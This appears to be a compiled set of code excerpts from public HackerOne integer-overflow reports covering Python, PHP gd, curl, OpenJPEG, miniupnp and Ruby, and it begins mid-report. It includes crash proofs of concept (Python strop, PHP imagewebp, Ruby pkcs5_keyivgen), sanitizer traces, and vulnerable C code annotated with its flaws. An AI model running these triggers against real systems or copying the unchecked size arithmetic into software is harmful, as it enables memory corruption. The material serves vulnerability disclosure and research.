              *q++ = ' ';
      } else {
          *q++ = *p;
          i++;
          if (*p == '\n')
              i = 0;
      }
  }
...
```

```
--- a/Modules/stropmodule.c Sun Mar 30 16:43:11 2014 -0400
+++ b/Modules/stropmodule.c Mon Mar 31 00:36:57 2014 +0200
@@ -624,6 +624,11 @@
         } else {
             j++;
             if (*p == '\n') {
+                if (i > PY_SSIZE_T_MAX - j){
+                    PyErr_SetString(PyExc_OverflowError,
+                                    "new string is too long");
+                    return NULL;
+                }
                 i += j;
                 j = 0;
             }
```

```
import strop

strs = []
for i in range(20):
  strs.append('\t\n' * 0x10000 + 'A' * 0x1000000)
for i in range(20):
  print hex(id(strs[i]))
strs[14] = None
strop.expandtabs(strs[15], 0x10001)
print strs[15]
```

## #170619 PHP Integer Overflow in gdImageWebpCtx — ibb — - — Memory Corruption - Generic
Source: `hackerone/reports/2020/170619.md` (https://hackerone.com/reports/170619)

```
<?php
    ini_set('memory_limit', -1);
    $im = imagecreatetruecolor(0x8000, 0x8001);
    imagewebp($im, 'php.webp');
    imagedestroy($im);
?>
```

```
==2583==ERROR: AddressSanitizer: heap-buffer-overflow on address
0x7ff13d43e800 at pc 0x000000a77d0d bp 0x7ffe8ecdae90 sp 0x7ffe8ecdae88
WRITE of size 1 at 0x7ff13d43e800 thread T0
    #0 0xa77d0c in gdImageWebpCtx /php_src/ext/gd/libgd/gd_webp.c:139:4
    #1 0x9c0aac in _php_image_output_ctx /php_src/ext/gd/gd_ctx.c:175:6
    #2 0x9aab7d in zif_imagewebp /php_src/ext/gd/gd.c:2690:2
    #3 0x2655967 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /php_src/Zend/zend_vm_execute.h:628:2
    #4 0x20399e0 in execute_ex /php_src/Zend/zend_vm_execute.h:432:7
    #5 0x203f75a in zend_execute /php_src/Zend/zend_vm_execute.h:474:2
    #6 0x1b41033 in zend_execute_scripts /php_src/Zend/zend.c:1464:4
    #7 0x160a813 in php_execute_script /php_src/main/main.c:2537:14
    #8 0x2babd79 in do_cli /php_src/sapi/cli/php_cli.c:990:5
    #9 0x2ba4f0d in main /php_src/sapi/cli/php_cli.c:1378:18
    #10 0x7ff25026ff44 in __libc_start_main /build/eglibc-oGUzwX/eglibc-2.19/csu/libc-start.c:287:0
    #11 0x469856 in _start ??:0:0

0x7ff13d43e800 is located 0 bytes to the right of 131072-byte region [0x7ff13d41e800,0x7ff13d43e800)
allocated by thread T0 here:
    #0 0x4f0812 in malloc ??:0:0
    #1 0x18e6886 in _emalloc /php_src/Zend/zend_alloc.c:2402:11
    #2 0xa774b0 in gdImageWebpCtx /php_src/ext/gd/libgd/gd_webp.c:123:20
    #3 0x9c0aac in _php_image_output_ctx /php_src/ext/gd/gd_ctx.c:175:6
    #4 0x9aab7d in zif_imagewebp /php_src/ext/gd/gd.c:2690:2
    #5 0x2655967 in ZEND_DO_ICALL_SPEC_RETVAL_UN
```

```
argb = (uint8_t *)gdMalloc(gdImageSX(im) * 4 * gdImageSY(im));  // integer overflow!!!
```

## #591770 Signed integer overflow in tool_progress_cb() — curl — - — Integer Overflow
Source: `hackerone/reports/2019/591770.md` (https://hackerone.com/reports/591770)

```
tool_cb_prg.c:129:22: runtime error: signed integer overflow: 9223372036854775807 - -1 cannot be represented in type 'long'
    #0 0x42fc40 in tool_progress_cb /root/curl/src/tool_cb_prg.c:129:22
    #1 0x562090 in Curl_pgrsUpdate /root/curl/lib/progress.c:484:16
    #2 0x4d3da1 in multi_runsingle /root/curl/lib/multi.c:2009:29
    #3 0x4cce1b in curl_multi_perform /root/curl/lib/multi.c:2066:14
    #4 0x4a7740 in easy_transfer /root/curl/lib/easy.c:624:15
    #5 0x4a7740 in easy_perform /root/curl/lib/easy.c:718
    #6 0x4a7740 in curl_easy_perform /root/curl/lib/easy.c:737
    #7 0x47fbb6 in operate_do /root/curl/src/tool_operate.c:1604:20
    #8 0x46a606 in operate /root/curl/src/tool_operate.c:2098:20
    #9 0x469176 in main /root/curl/src/tool_main.c:326:14
    #10 0x7f9199d682e0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202e0)
    #11 0x409fe9 in _start (/root/curl/src/curl+0x409fe9)

tool_cb_prg.c:135:22: runtime error: signed integer overflow: 9223372036854775807 - -1 cannot be represented in type 'long'
    #0 0x42fe09 in tool_progress_cb /root/curl/src/tool_cb_prg.c:135:22
    #1 0x562090 in Curl_pgrsUpdate /root/curl/lib/progress.c:484:16
    #2 0x4d3da1 in multi_runsingle /root/curl/lib/multi.c:2009:29
    #3 0x4cce1b in curl_multi_perform /root/curl/lib/multi.c:2066:14
    #4 0x4a7740 in easy_transfer /root/curl/lib/easy.c:624:15
    #5 0x4a7740 in easy_perform /root/curl/lib/easy.c:718
    #6 0x4a7740 in curl_easy_perform /root/curl/lib/easy.c:737

```

```
    #0 0x42fc40 in tool_progress_cb /root/curl/src/tool_cb_prg.c:129:22
    #1 0x562090 in Curl_pgrsUpdate /root/curl/lib/progress.c:484:16
    #2 0x4d3da1 in multi_runsingle /root/curl/lib/multi.c:2009:29
    #3 0x4cce1b in curl_multi_perform /root/curl/lib/multi.c:2066:14
    #4 0x4a7740 in easy_transfer /root/curl/lib/easy.c:624:15
    #5 0x4a7740 in easy_perform /root/curl/lib/easy.c:718
    #6 0x4a7740 in curl_easy_perform /root/curl/lib/easy.c:737
    #7 0x47fbb6 in operate_do /root/curl/src/tool_operate.c:1604:20
    #8 0x46a606 in operate /root/curl/src/tool_operate.c:2098:20
    #9 0x469176 in main /root/curl/src/tool_main.c:326:14
    #10 0x7f9199d682e0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202e0)
    #11 0x409fe9 in _start (/root/curl/src/curl+0x409fe9)
```

```
    #0 0x42fe09 in tool_progress_cb /root/curl/src/tool_cb_prg.c:135:22
    #1 0x562090 in Curl_pgrsUpdate /root/curl/lib/progress.c:484:16
    #2 0x4d3da1 in multi_runsingle /root/curl/lib/multi.c:2009:29
    #3 0x4cce1b in curl_multi_perform /root/curl/lib/multi.c:2066:14
    #4 0x4a7740 in easy_transfer /root/curl/lib/easy.c:624:15
    #5 0x4a7740 in easy_perform /root/curl/lib/easy.c:718
    #6 0x4a7740 in curl_easy_perform /root/curl/lib/easy.c:737
    #7 0x47fbb6 in operate_do /root/curl/src/tool_operate.c:1604:20
    #8 0x46a606 in operate /root/curl/src/tool_operate.c:2098:20
    #9 0x469176 in main /root/curl/src/tool_main.c:326:14
    #10 0x7f9199d682e0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202e0)
    #11 0x409fe9 in _start (/root/curl/src/curl+0x409fe9)
```

## #3238249 Integer Overflow Risk in HTTP/2 Proxy Window Size Calculations — curl — - — Integer Overflow
Source: `hackerone/reports/2025/3238249.md` (https://hackerone.com/reports/3238249)

```
                                     PROXY_HTTP2_HUGE_WINDOW_SIZE);
```

## #600359 Integer overflow in the source code tool_cb_prg.c — curl — - — Integer Overflow
Source: `hackerone/reports/2021/600359.md` (https://hackerone.com/reports/600359)

```
69 static void fly(struct ProgressData *bar, bool moved)
70 {
71   char buf[256];
72   int pos;
73   int check = bar->width - 2;
74 
75   msnprintf(buf, sizeof(buf), "%*s\r", bar->width-1, " ");
76   memcpy(&buf[bar->bar], "-=O=-", 5);
77
78  pos = sinus[bar->tick%200] / (10000 / check);
79  buf[pos] = '#';
80  pos = sinus[(bar->tick + 5)%200] / (10000 / check);
81  buf[pos] = '#';
82  pos = sinus[(bar->tick + 10)%200] / (10000 / check);
83  buf[pos] = '#';
84  pos = sinus[(bar->tick + 15)%200] / (10000 / check);
85  buf[pos] = '#';
```

## #167512 CVE-2016-7163 OpenJPEG opj_pi_create_decode Integer Overflow Vulnerability — ibb — - — Memory Corruption - Generic
Source: `hackerone/reports/2019/167512.md` (https://hackerone.com/reports/167512)

```
wget https://github.com/uclouvain/openjpeg/archive/4a2a8693e5a02207a8813b02a375abdc4e43c49b.zip
unzip -q 4a2a8693e5a02207a8813b02a375abdc4e43c49b.zip
mv openjpeg-4a2a8693e5a02207a8813b02a375abdc4e43c49b openjpeg
cd openjpeg
export CC='/usr/bin/clang -g -O0 -fsanitize=address'
cmake .
make

cd bin
./opj_decompress -o image.pgm -i poc.jp2
```

```
static OPJ_BOOL opj_pi_next_cprl(opj_pi_iterator_t * pi) {
    // ...
    for (pi->layno = pi->poc.layno0; pi->layno < pi->poc.layno1; pi->layno++) {
        index = pi->layno * pi->step_l + pi->resno * pi->step_r + pi->compno * pi->step_c + pi->precno * pi->step_p;
        if (!pi->include[index]) {      // ----> Out-Of-Bounds Read!!!
            pi->include[index] = 1;     // ----> Out-Of-Bounds Write!!!
            return OPJ_TRUE;
        }
    // ...
    return OPJ_FALSE;
}
```

```
opj_pi_iterator_t *opj_pi_create_decode(opj_image_t *p_image,
                                        opj_cp_t *p_cp,
                                        OPJ_UINT32 p_tile_no)
{
    // ...
    l_step_p = 1;
    l_step_c = l_max_prec * l_step_p;
    l_step_r = p_image->numcomps * l_step_c;
    l_step_l = l_max_res * l_step_r;

    /* set values for first packet iterator */
    l_current_pi = l_pi;

    /* memory allocation for include */
    l_current_pi->include = (OPJ_INT16*) opj_calloc(
        (l_tcp->numlayers +1) * l_step_l, sizeof(OPJ_INT16));   // ----> Integer Overflow!!!
    // ...
}
```

## #627245 Integer overlow in "header_append" function — curl — - — Integer Overflow
Source: `hackerone/reports/2021/627245.md` (https://hackerone.com/reports/627245)

```
static CURLcode header_append(struct Curl_easy *data,
                              struct SingleRequest *k,
                              size_t length)
{
  size_t newsize = k->hbuflen + length; // <-- here there is the point of the integer overflow (length is user controllable)
// the value of "newsize" will be small and minor than CURL_MAX_HTTP_HEADER
  if(newsize > CURL_MAX_HTTP_HEADER) {
    /* The reason to have a max limit for this is to avoid the risk of a bad
       server feeding libcurl with a never-ending header that will cause
       reallocs infinitely */
    failf(data, "Rejected %zu bytes header (max is %d)!", newsize,
          CURL_MAX_HTTP_HEADER);
    return CURLE_OUT_OF_MEMORY;
  }
...
// here the length is a big number, and it can lead in a heap overflow
  memcpy(k->hbufp, k->str_start, length);
  k->hbufp += length;
  k->hbuflen += length;
  *k->hbufp = 0;

  return CURLE_OK;
}
```

```
                              struct SingleRequest *k,
                              size_t length)
```

```
    /* The reason to have a max limit for this is to avoid the risk of a bad
       server feeding libcurl with a never-ending header that will cause
       reallocs infinitely */
    failf(data, "Rejected %zu bytes header (max is %d)!", newsize,
          CURL_MAX_HTTP_HEADER);
    return CURLE_OUT_OF_MEMORY;
```

## #28640 Ericsson Erlang OTP Core Allocation Subsystem Integer Overflow (All Versions) — ibb — - — Memory Corruption - Generic
Source: `hackerone/reports/2019/28640.md` (https://hackerone.com/reports/28640)

```
    Uint bsize = ERTS_SIZEOF_Binary(size) + CHICKEN_PAD;
```

## #227344 CVE-2017-8798 - miniupnp getHTTPResponse chunked encoding integer signedness error — ibb — - — Integer Overflow
Source: `hackerone/reports/2019/227344.md` (https://hackerone.com/reports/227344)

```
      client (miniupnpc)                         server (poc.py)
          |                                         |
          |                                         |
          | SSDP:  Discovery - M-SEARCH             |
      1.  | --------------------------------------> |
          |                                         |
          | SSDP:  Reply - Location Header          |
      2.  | <-------------------------------------- |
          |                                         |
          | SCPD:  GET (Location Header/xxxx.xml)   |
      3.  | --------------------------------------> |
          |                                         |
          | SCPD:  HTTP chunked-encoded reply       |
      4.  | <-------------------------------------- |
          |                                         |
```

```
        basically all `miniwget*` and `UPNP_*` methods.
        * getHTTPResponse (vulnerable)
          * miniwget3
           * miniwget2
            * miniwget
            * miniwget_getaddr
             * UPNP_GetIGDFromUrl
             * UPNP_GetValidIGD
              * UPnP_selectigd
          * UPNP_Get*
          * UPNP_Check*
          * UPNP_Delete*
          * UPNP_Update*
          * UPNP_Add*
```

## #73260 Integer overflow in _json_encode_unicode leads to crash — ibb — - — None
Source: `hackerone/reports/2015/73260.md` (https://hackerone.com/reports/73260)

```
# static PyObject *
# escape_unicode(PyObject *pystr)
# {
#     /* Take a PyUnicode pystr and return a new escaped PyUnicode */
#     Py_ssize_t i;
#     Py_ssize_t input_chars;
#     Py_ssize_t output_size;
#     Py_ssize_t chars;
#     PyObject *rval;
#     void *input;
#     int kind;
#     Py_UCS4 maxchar;
# 
#     if (PyUnicode_READY(pystr) == -1)
#         return NULL;
# 
#     maxchar = PyUnicode_MAX_CHAR_VALUE(pystr);
#     input_chars = PyUnicode_GET_LENGTH(pystr);
#     input = PyUnicode_DATA(pystr);
#     kind = PyUnicode_KIND(pystr);
# 
#     /* Compute the output size */
#     for (i = 0, output_size = 2; i < input_chars; i++) {
#         Py_UCS4 c = PyUnicode_READ(kind, input, i);
#         switch (c) {
#         case '\\': case '"': case '\b': case '\f':
#         case '\n': case '\r': case '\t':
#             output_size += 2;
#             break;
#         default:
#             if (c <= 0x1f)
#                 output_size += 6;
#             else
#                 output_size++;
#         }
#     }
#
#     rval = PyUnicode_New(output_size, maxchar);
#
# 1.) if c is <= 0x1f then output_size += 6. There are no overflow checks on this variable.
# 2.) rval buffer is too small to hold results
#
# Crash:
# ------
#
# Program received signal SIGSEGV, Segmentation fault.
# 0xb7a2e9be in escape_unicode (pystr=pystr@entry=0x8cf81018)
#     at /home/pail/cpython/Modules/_json.c:306
# 306                ENCODE_OUTPUT;
#
# OS info
# --------
#  %./python -V
#  > Python 3
```

## #304115 Integer Underflow @ ossl_cipher_pkcs5_keyivgen  — ruby — - — Integer Underflow
Source: `hackerone/reports/2018/304115.md` (https://hackerone.com/reports/304115)

```
cipher.pkcs5_keyivgen(pass, salt = nil, iterations = 2048, digest = "MD5") -> nil
```

```
for (i = 1; i < (unsigned int)count; i++) {
  if (!EVP_DigestInit_ex(c, md, NULL))
  [code redacted]
]
```

```
require 'digest'
require 'openssl'
require 'base64'

data = 'abc'
key = '1234567887654321'
iv = key[0..7]
cipher = OpenSSL::Cipher::Cipher.new('DES-EDE3-CBC') # or any other algorithm?

cipher.encrypt
cipher.pkcs5_keyivgen(key, iv, -1)
output = cipher.update(data)
output << cipher.final
```

## #1564922 Integer overflows in unescape_word() — curl — - — Integer Overflow
Source: `hackerone/reports/2022/1564922.md` (https://hackerone.com/reports/1564922)

```
    /* According to RFC2229 section 2.2, these letters need to be escaped with
       \[letter] */
      if((ch <= 32) || (ch == 127) ||
          (ch == '\'') || (ch == '\"') || (ch == '\\')) {
        dictp[olen++] = '\\';
      }
```

```
static char *unescape_word(const char *inputbuff)
{
  char *newp = NULL;
  char *dictp;
  size_t len;

  CURLcode result = Curl_urldecode(inputbuff, 0, &newp, &len,          <------------- get len
                                   REJECT_NADA);
  if(!newp || result)
    return NULL;

  dictp = malloc(len*2 + 1);    <------------ overflow here
//.....
}
```

```
                                   REJECT_NADA);
```

